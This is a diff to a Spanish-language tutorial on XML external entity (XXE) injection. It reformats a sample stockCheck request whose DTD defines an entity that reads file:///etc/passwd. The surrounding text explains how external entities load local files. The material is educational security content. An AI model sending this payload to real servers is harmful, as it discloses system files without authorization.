@@ -79,7 +79,6 @@ La declaración de una entidad externa utiliza la SYSTEMpalabra clave y debe esp
 ```  
   
   
-```
   
 La URL puede usar el file://protocolo, por lo que las entidades externas se pueden cargar desde el archivo. Por ejemplo:  
   
@@ -94,10 +93,14 @@ La URL puede usar el file://protocolo, por lo que las entidades externas se pued
   
   ```
 
-<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<stockCheck><productId>
+<?xml version="1.0" encoding="UTF-8"?>
+ <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+<productId>
 &xxe;
-</productId><storeId>2</storeId></stockCheck>
+</productId>
+<storeId>2</storeId>
+</stockCheck>
 
   ```
 El &xxe; llama a la entidad que definimos en el DTD
